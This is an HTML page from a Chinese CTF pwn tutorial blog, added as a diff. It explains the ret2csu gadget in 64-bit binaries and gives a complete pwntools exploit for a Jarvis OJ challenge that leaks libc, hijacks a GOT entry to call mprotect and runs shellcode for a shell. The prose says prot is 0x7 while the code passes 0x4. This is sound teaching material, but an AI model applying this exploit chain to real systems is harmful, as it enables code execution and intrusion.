@@ -1,0 +1,489 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>栈溢出入门到放弃4 - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="一、中级栈溢出总结：来到中级栈溢出这里，当64位的程序很难得到有用的rop链时（参数在rdi，rsi，rdx中，通常是很难凑齐这3个的）就需要我们用程序现有的链子去构造，找找看：
+重点介绍一个64位,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">栈溢出入门到放弃4</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%834/" title="栈溢出入门到放弃4" class="">栈溢出入门到放弃4</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    15k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    13 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/stack/" rel="tag">stack</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h3 id="一、中级栈溢出总结："><a href="#一、中级栈溢出总结：" class="headerlink" title="一、中级栈溢出总结："></a>一、中级栈溢出总结：</h3><p>来到中级栈溢出这里，当64位的程序很难得到有用的rop链时（参数在rdi，rsi，rdx中，通常是很难凑齐这3个的）就需要我们用程序现有的链子去构造，找找看：</p>
+<p>重点介绍一个64位的很好用的ROP链子，这个链子是根据</p>
+<p><img src="/blog_img/1562216438697.png" alt="1562216438697"></p>
+<p>这两个函数的汇编写出来的，我们可以去看看：</p>
+<p><img src="/blog_img/1562216634032.png" alt="1562216634032"></p>
+<p>就是这里了，看到loc_4006A6和loc_400690两个位置，这里怎么利用呢？</p>
+<p>首先先读懂这段汇编的意思：首先执行抬一次栈的操作，接着要pop6个参数到相应的寄存器中，然后是ret，接着看到上面mov那里，很清晰，r13就是第三个参数，r14就是第二个参数，r15d（低8位）就是第一个参数rdi（edi表示低8位），接着call，r12存放就是需要调用的函数的地址，这里需要让rbx=0，才能完美地实现r12就是调用地址，接着比较rbx和rbp，所以rbp = rbx = 0，才能继续往下执行，不然又跳回mov那里了，继续往下执行，我们需要的只有ret，所以前面的抬栈和ret都可以用垃圾字符填充，这里7条指令需要有56个字节去填充，也就是0x38,个字节，填充了，才能完美到达ret，ret这里填我们想要跳转的地址，这样就完美地利用起来了，总的执行逻辑就是：</p>
+<p><img src="/blog_img/1562217310673.png" alt="1562217310673"></p>
+<p>为了以后调用方便，总结这里我用一个函数去封装了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pppppp_ret = <span class="number">0x004006A6</span></span><br><span class="line">mov_ret = <span class="number">0x0400690</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mid_overflow</span><span class="params">(func_plt,rdi,rsi,rdx,next_func)</span>:</span></span><br><span class="line">	payload = <span class="string">''</span></span><br><span class="line">	payload += <span class="string">'a'</span>*<span class="number">136</span>   //填栈溢出的偏移</span><br><span class="line">	payload += p64(pppppp_ret)  //开始地址</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">1</span>)</span><br><span class="line">	payload += p64(func_plt)  //调用函数的地址</span><br><span class="line">	payload += p64(rdx)       //<span class="number">64</span>位的参数</span><br><span class="line">	payload += p64(rsi)</span><br><span class="line">	payload += p64(rdi)</span><br><span class="line">	payload += p64(mov_ret)   //跳转地址</span><br><span class="line">	payload += p64(<span class="number">0</span>)    //垃圾字符，<span class="number">7</span>行</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(next_func)    //下一跳函数地址</span><br><span class="line">	ru(<span class="string">'Input:\n'</span>)</span><br><span class="line">	sd(payload)</span><br><span class="line">mid_overflow(write_plt,<span class="number">1</span>,read_got,<span class="number">8</span>,vul_func_addr) //调用的write函数，往read_got表里面写入<span class="number">8</span>字节的数据，接着执行vul_func_addr函数</span><br></pre></td></tr></table></figure>
+
+<p>纸上谈兵没有用，来道题目压压惊~</p>
+<p>OJ的level5（假定system函数和execve函数用不了）</p>
+<p>链接：<a href="https://pan.baidu.com/s/1IZHwBkEdBzhhcAEnIUgy5w" target="_blank" rel="noopener">https://pan.baidu.com/s/1IZHwBkEdBzhhcAEnIUgy5w</a><br>提取码：hvaz </p>
+<p><img src="/blog_img/1562217801758.png" alt="1562217801758"></p>
+<p><img src="/blog_img/1562217711984.png" alt="1562217711984">)<img src="/blog_img/1562217719996.png" alt="1562217719996"></p>
+<p>逻辑很简单，栈溢出，但是假设没有system和execve的情况下（实际上很常见，以后会遇见的），就是说泄露真实地址调用system已经不现实，但是shellcode也没有用呀，NX保护开了，这可咋整？于是去学习一波，解锁了新姿势—-mprotect函数的运用（修改内存段权限），这样如果我们修改bss段的权限，让它可执行，那么不就可以把shellcode写到上面了吗?这里先来学习一波mprotect：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">＃include &lt;sys/mman.h&gt;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>; </span><br><span class="line"></span><br><span class="line">此函数把自addr开始的、长度为len的内存区的保护属性修改为prot指定的值，ｐｒｏｔ值如下：</span><br><span class="line"></span><br><span class="line">ｐｒｏｔ标签值　        描述</span><br><span class="line">PROT_NONE   The memory cannot be accessed at all.</span><br><span class="line">PROT_READ   The memory can be <span class="built_in">read</span>.</span><br><span class="line">PROT_WRITE  The memory can be written to.</span><br><span class="line">PROT_EXEC   The memory can contain executing code.</span><br><span class="line">还记得chmod <span class="number">777</span> 吗？我们port置为<span class="number">7</span>，表示可读可写可执行~</span><br></pre></td></tr></table></figure>
+
+<p>了解了这个函数，那么要怎么调用这个函数呢？想到got表修改，首先利用write函数泄露出read的真实地址，就可以得到mprotect的真实地址，接着可以往libc_start_main的got表写入mprotect的地址，这样调用libc_start_mian，就是调用mprotect，实现欺骗执行任意我们想要执行的函数。那么能执行mprotect了，就能写入参数（0x600000，0x1000，0x7），这里表示把0x600000到0x601000的内存段变为有可执行的权限。接着可以上shellcode了，接着二次跳转再跑一次程序，直接ret到bss地址即可getshell。</p>
+<p>上exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./level3_x64'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9884</span>)</span><br><span class="line">	libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line">vul_func_addr = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line">main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">read_libc = libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">mprotect_libc = libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">pppppp_ret = <span class="number">0x004006A6</span></span><br><span class="line">mov_ret = <span class="number">0x0400690</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mid_overflow</span><span class="params">(func_plt,rdi,rsi,rdx,next_func)</span>:</span></span><br><span class="line">	payload = <span class="string">''</span></span><br><span class="line">	payload += <span class="string">'a'</span>*<span class="number">136</span></span><br><span class="line">	payload += p64(pppppp_ret)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">1</span>)</span><br><span class="line">	payload += p64(func_plt)</span><br><span class="line">	payload += p64(rdx)</span><br><span class="line">	payload += p64(rsi)</span><br><span class="line">	payload += p64(rdi)</span><br><span class="line">	payload += p64(mov_ret)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(next_func)</span><br><span class="line">	ru(<span class="string">'Input:\n'</span>)</span><br><span class="line">	sd(payload)</span><br><span class="line"></span><br><span class="line">mid_overflow(write_got,<span class="number">1</span>,read_got,<span class="number">8</span>,vul_func_addr)</span><br><span class="line">read_addr = u64(rc(<span class="number">8</span>))</span><br><span class="line">mprotect_addr = read_addr - read_libc + mprotect_libc</span><br><span class="line"><span class="keyword">print</span> <span class="string">"mprotect_addr---&gt;"</span> + hex(mprotect_addr)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">mid_overflow(read_got,<span class="number">0</span>,bss_addr,len(shellcode),vul_func_addr)</span><br><span class="line">sd(shellcode)</span><br><span class="line"></span><br><span class="line">mid_overflow(read_got,<span class="number">0</span>,main_got,<span class="number">8</span>,vul_func_addr)</span><br><span class="line">sd(p64(mprotect_addr))</span><br><span class="line"></span><br><span class="line">mid_overflow(main_got,<span class="number">0x600000</span>,<span class="number">0x1000</span>,<span class="number">0x4</span>,vul_func_addr)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">ru(<span class="string">'Input:\n'</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>改前：rw-p</p>
+<p><img src="/blog_img/1562218915200.png" alt="1562218915200"></p>
+<p>改后：rwxp</p>
+<p><img src="/blog_img/1562219045809.png" alt="1562218823861"></p>
+<p><img src="/blog_img/1562218694287.png" alt="1562218694287"></p>
+<p>getshell<del>这里用到了一个mprotect的知识，用到了修改got表的知识，也用到了中级栈溢出的知识，是一道不错的题目，懂了受益挺大，不懂就再看看</del>搞懂再往下学。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、中级栈溢出总结："><span class="toc-number">1.</span> <span class="toc-text">一、中级栈溢出总结：</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
